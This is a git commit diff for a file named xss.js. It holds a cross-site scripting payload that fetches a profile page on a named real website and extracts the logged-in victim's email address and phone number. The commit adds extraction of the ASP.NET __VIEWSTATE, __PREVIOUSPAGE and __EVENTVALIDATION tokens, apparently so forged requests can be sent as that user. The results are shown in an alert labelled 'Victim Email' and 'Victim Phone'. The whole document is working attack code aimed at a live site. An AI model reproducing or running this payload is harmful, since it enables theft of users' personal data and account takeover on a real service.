a7d71768df621c9ce5e13ea2e0933cfc8baaf684
zinc000 <140118579+zinc000@users.noreply.github.com>
2025-08-02 20:28:03 +0300

    Update xss.js

--- xss.js
+++ xss.js
@@ -5,8 +5,12 @@ fetch("https://www.profound.com/Pages/Subscriptions/ProfileManagement.aspx?view=
 .then(html => {
     let parser = new DOMParser();
     let doc = parser.parseFromString(html, "text/html");
-    let email = doc.querySelector("#BodyArea_MainContentArea_radEmailAddress_text")?.value || "Not found";
-    let phone = doc.querySelector("#BodyArea_MainContentArea_radPhone_text")?.value || "Not found";
+    let email = doc.querySelector("#BodyArea_MainContentArea_radEmailAddress_text")?.value;
+    let phone = doc.querySelector("#BodyArea_MainContentArea_radPhone_text")?.value;
 
-    alert("Email: " + email + "\nPhone: " + phone);
+    let viewstate = html.match(/id="__VIEWSTATE" value="([^"]+)"/)?.[1];
+    let previousPage = html.match(/id="__PREVIOUSPAGE" value="([^"]+)"/)?.[1];
+    let eventValidation = html.match(/id="__EVENTVALIDATION" value="([^"]+)"/)?.[1];
+
+    alert("Victim Email is: " + email + "\nVictim Phone is: " + phone + "__VIEWSTATE:\n" + viewstate + "\n\n__PREVIOUSPAGE:\n" + previousPage + "\n\n__EVENTVALIDATION:\n" + eventValidation);
 });
